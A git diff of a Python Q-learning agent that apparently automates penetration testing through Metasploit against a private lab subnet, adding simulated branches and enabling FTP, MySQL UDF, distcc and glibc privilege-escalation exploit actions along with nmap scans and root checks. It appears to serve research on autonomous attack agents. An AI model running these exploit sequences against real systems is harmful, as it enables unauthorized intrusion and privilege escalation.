@@ -26,7 +26,7 @@ class QLearningTable:
         self.simulation= simulation
         if simulation:
             #self.simulation_environment= Simulation1()
-            self.simulation_environment= Simulation2(["192.168.56.101","192.168.56.102","192.168.56.103","192.168.56.104","192.168.56.105"],"192.168.56.105","192.168.56.101")
+            self.simulation_environment= Simulation2(["192.168.56.101","192.168.56.102","192.168.56.103","192.168.56.104","192.168.56.105","192.168.56.106","192.168.56.107","192.168.56.108","192.168.56.109"],"192.168.56.109","192.168.56.101")
         
         self.global_positive_out = list()
         self.global_console_status = False
@@ -199,14 +199,15 @@ class QLearningTable:
                 str(self.background): self.background,
                 str(self.ssh_login): self.ssh_login,
                 #str(self.samba): self.samba,
-                #str(self.ftp1): self.ftp1,
-                #str(self.mysql): self.mysql,
+                str(self.ftp1): self.ftp1,
+                str(self.mysql): self.mysql,
                 str(self.dirtyCow): self.dirtyCow,
                 #str(self.ls): self.ls,
-                #str(self.distcc): self.distcc,
+                str(self.distcc): self.distcc,
                 #str(self.postgresql): self.postgresql,
                 #str(self.pivot_autoroute): self.pivot_autoroute,
-                str(self.pivot_autoroute_4): self.pivot_autoroute_4
+                str(self.pivot_autoroute_4): self.pivot_autoroute_4,
+                str(self.glibc_origin_expansion_priv_esc): self.glibc_origin_expansion_priv_esc
                 }
 
     def choose_action(self, observation):
@@ -276,7 +277,8 @@ class QLearningTable:
             print('whoami= ' + whoami2)
             print('reward= '+ str(reward))
         elif (whoami2 != 'root') and (success2==True) : # à optimiser
-            reward = -0.001    # VERIFIER S'IL FAUT LAISSER COMME CA
+            reward = -0.0001    # VERIFIER S'IL FAUT LAISSER COMME CA
+            #reward=0
             done = False
             s_ = str(observation_dict)  # voir comment récuperer la string 'ssh_login' de la fonction dont le nom est ssh_login()
             print('\nsuccess= '+str(success2))
@@ -564,7 +566,8 @@ class QLearningTable:
  
                     a= self.success
                     
-                    self.nmap_hosts()
+                    if a:
+                        self.nmap_hosts()
                     
                     b= self.simulation_environment.whoami()
                 
@@ -619,81 +622,75 @@ class QLearningTable:
         return False, "Not root"
         
     def ftp1(self):
-        RPORT='21'+'_ip'+str(self.victim_number)
-        
-        if self.nmap_dict['victim_'+str(self.victim_number)][RPORT]=='open': #on vérifie que le port visé est bien ouvert
-            self.console.execute('use exploit/multi/ftp/pureftpd_bash_env_exec')
-            time.sleep(10)
-            c= self.action_in_the_right_shell
+        if self.simulation == False:
+            RPORT='21'+'_ip'+str(self.victim_number)
             
-            if c:
-                self.console.execute('set RHOST ' + self.current_victim_ip_address)
-                time.sleep(4)
-                self.console.execute('exploit')
-                time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
-                a= self.success
-                
-                if a:
-                    self.nmap_hosts()
-                    time.sleep(15)
-                    self.console.execute('whoami')
-                    time.sleep(4)
-                    
-                b= self.whoami
-                
-                return a, b
-            
-            else:
-                return False, 'Not root'
-        
-        return False, 'Not root'
-    
-    def mysql(self):
-        RPORT='3306'+'_ip'+str(self.victim_number)
-        
-        if self.nmap_dict['victim_'+str(self.victim_number)][RPORT]=='open': #on vérifie que le port visé est bien ouvert
-            self.console.execute('use exploit/multi/mysql/mysql_udf_payload')
-            time.sleep(10)
-            c= self.action_in_the_right_shell
-            
-            if c:
-                self.console.execute('set RHOST ' + self.current_victim_ip_address)
-                time.sleep(4)
-                self.console.execute('exploit')
-                time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
-                a= self.success
-                
-                if a:
-                    self.nmap_hosts()
-                    time.sleep(15)
-                    self.console.execute('whoami')
-                    time.sleep(4)
-                
-                b= self.whoami
-            
-                return a, b
-            
-            else:
-                return False, 'Not root'
-            
-        return False, 'Not root'
-        
-        
-    def distcc(self):
-        RPORT='3632'+'_ip'+str(self.victim_number)
-        
-        try:
             if self.nmap_dict['victim_'+str(self.victim_number)][RPORT]=='open': #on vérifie que le port visé est bien ouvert
-                self.console.execute('use exploit/unix/misc/distcc_exec')
+                self.console.execute('use exploit/multi/ftp/pureftpd_bash_env_exec')
                 time.sleep(10)
-                c=self.action_in_the_right_shell
+                c= self.action_in_the_right_shell
                 
                 if c:
-                    self.console.execute('set RHOSTS ' + self.current_victim_ip_address)
-                    time.sleep(3)
+                    self.console.execute('set RHOST ' + self.current_victim_ip_address)
+                    time.sleep(4)
                     self.console.execute('exploit')
-                    time.sleep(15)
-                    a=self.success
+                    time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
+                    a= self.success
+                    
+                    if a:
+                        self.nmap_hosts()
+                        time.sleep(15)
+                        self.console.execute('whoami')
+                        time.sleep(4)
+                        
+                    b= self.whoami
+                    
+                    return a, b
+                
+                else:
+                    return False, 'Not root'
+            
+            return False, 'Not root'
+        
+        else:
+            RPORT='21'+'_ip'+str(self.victim_number)
+            
+            if self.nmap_dict['victim_'+str(self.victim_number)][RPORT]=='open': #on vérifie que le port visé est bien ouvert
+                result= self.simulation_environment.ftp1(self.current_victim_ip_address)
+                self.read_simulated_console(result)
+                
+                c= self.action_in_the_right_shell
+                
+                if c:
+                    a= self.success
+                    
+                    if a:
+                        self.nmap_hosts()
+                        
+                    b= self.simulation_environment.whoami()
+                    
+                    return a, b
+                
+                else:
+                    return False, 'Not root'
+            
+            return False, 'Not root'
+    
+    def mysql(self):
+        if self.simulation == False:
+            RPORT='3306'+'_ip'+str(self.victim_number)
+            
+            if self.nmap_dict['victim_'+str(self.victim_number)][RPORT]=='open': #on vérifie que le port visé est bien ouvert
+                self.console.execute('use exploit/multi/mysql/mysql_udf_payload')
+                time.sleep(10)
+                c= self.action_in_the_right_shell
+                
+                if c:
+                    self.console.execute('set RHOST ' + self.current_victim_ip_address)
+                    time.sleep(4)
+                    self.console.execute('exploit')
+                    time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
+                    a= self.success
                     
                     if a:
                         self.nmap_hosts()
@@ -707,12 +704,99 @@ class QLearningTable:
                 
                 else:
                     return False, 'Not root'
-            
+                
             return False, 'Not root'
         
-        except BaseException:
-            print('An error was raised !')
+        else:
+            RPORT='3306'+'_ip'+str(self.victim_number)
+            
+            if self.nmap_dict['victim_'+str(self.victim_number)][RPORT]=='open': #on vérifie que le port visé est bien ouvert
+                result= self.simulation_environment.mysql(self.current_victim_ip_address)
+                self.read_simulated_console(result)
+                
+                c= self.action_in_the_right_shell
+                
+                if c:
+                    a= self.success
+                    
+                    if a:
+                        self.nmap_hosts()
+                    
+                    b= self.simulation_environment.whoami()
+                
+                    return a, b
+                
+                else:
+                    return False, 'Not root'
+                
             return False, 'Not root'
+        
+        
+    def distcc(self):
+        if self.simulation == False:
+            RPORT='3632'+'_ip'+str(self.victim_number)
+            
+            try:
+                if self.nmap_dict['victim_'+str(self.victim_number)][RPORT]=='open': #on vérifie que le port visé est bien ouvert
+                    self.console.execute('use exploit/unix/misc/distcc_exec')
+                    time.sleep(10)
+                    c=self.action_in_the_right_shell
+                    
+                    if c:
+                        self.console.execute('set RHOSTS ' + self.current_victim_ip_address)
+                        time.sleep(3)
+                        self.console.execute('exploit')
+                        time.sleep(15)
+                        a=self.success
+                        
+                        if a:
+                            self.nmap_hosts()
+                            time.sleep(15)
+                            self.console.execute('whoami')
+                            time.sleep(4)
+                        
+                        b= self.whoami
+                    
+                        return a, b
+                    
+                    else:
+                        return False, 'Not root'
+                
+                return False, 'Not root'
+            
+            except BaseException:
+                print('An error was raised !')
+                return False, 'Not root'
+        
+        else:
+            RPORT='3632'+'_ip'+str(self.victim_number)
+            
+            try:
+                if self.nmap_dict['victim_'+str(self.victim_number)][RPORT]=='open': #on vérifie que le port visé est bien ouvert
+                    result= self.simulation_environment.distcc(self.current_victim_ip_address)
+                    self.read_simulated_console(result)
+                    
+                    c=self.action_in_the_right_shell
+                    
+                    if c:
+                        
+                        a=self.success
+                        
+                        if a:
+                            self.nmap_hosts()
+                        
+                        b= self.simulation_environment.whoami()
+                    
+                        return a, b
+                    
+                    else:
+                        return False, 'Not root'
+                
+                return False, 'Not root'
+            
+            except BaseException:
+                print('An error was raised !')
+                return False, 'Not root'
         
     def postgresql(self):
         RPORT='5432'+'_ip'+str(self.victim_number)
@@ -797,33 +881,51 @@ class QLearningTable:
                 return False, 'Not root'
         
     def glibc_origin_expansion_priv_esc(self):
-        if self.session >0:
-            self.background() # A REVOIR, self.background EST UNE ACTION A PART, IL FAUT PAS LA METTRE DANS UNE AUTRE ACTION
-            self.console.execute('use linux/local/glibc_origin_expansion_priv_esc')
-            time.sleep(4)
-            self.console.execute('set session ' + str(self.session))
-            time.sleep(4)
-            self.console.execute('run')
-            time.sleep(20)
-            
-            a= self.success
+        if self.simulation == False:
+            if self.session >0:
+                self.background() # A REVOIR, self.background EST UNE ACTION A PART, IL FAUT PAS LA METTRE DANS UNE AUTRE ACTION
+                self.console.execute('use linux/local/glibc_origin_expansion_priv_esc')
+                time.sleep(4)
+                self.console.execute('set session ' + str(self.session))
+                time.sleep(4)
+                self.console.execute('run')
+                time.sleep(20)
                 
-            if a:
-                #VERIFIER SI C'EST BIEN COMME CELA QUE FONCTIONNE L'EXPLOIT, C'EST A DIRE S'IL CREE UNE NOUVELLE SESSION ET PUIS IL FAUT SE CONNECTER A CETTE SESSION
-                self.console.execute('sessions -i ' + str(self.session))
-                time.sleep(4)
-                self.console.execute('whoami')
-                time.sleep(4)
+                a= self.success
+                    
+                if a:
+                    #VERIFIER SI C'EST BIEN COMME CELA QUE FONCTIONNE L'EXPLOIT, C'EST A DIRE S'IL CREE UNE NOUVELLE SESSION ET PUIS IL FAUT SE CONNECTER A CETTE SESSION
+                    self.console.execute('sessions -i ' + str(self.session))
+                    time.sleep(4)
+                    self.console.execute('whoami')
+                    time.sleep(4)
+                
+                b= self.whoami
             
-            b= self.whoami
-        
-            #while self.global_console_status:
-            #while console.console.read()['busy']:
-            #time.sleep(2)
-            return a, b
+                #while self.global_console_status:
+                #while console.console.read()['busy']:
+                #time.sleep(2)
+                return a, b
+                
+            else:
+                return False, 'Not root'
             
-        else:
-            return False, 'Not root'
+        else: # A REVOIR
+            if self.session >0:
+                result=self.simulation_environment.glibc_origin_expansion_priv_esc()
+                self.read_simulated_console(result)
+                
+                a= self.success
+                
+                b= self.simulation_environment.whoami()
+            
+                #while self.global_console_status:
+                #while console.console.read()['busy']:
+                #time.sleep(2)
+                return a, b
+                
+            else:
+                return False, 'Not root'
         
     def pivot_autoroute(self):
         #self.console.execute('sessions -u '+ str(self.session))
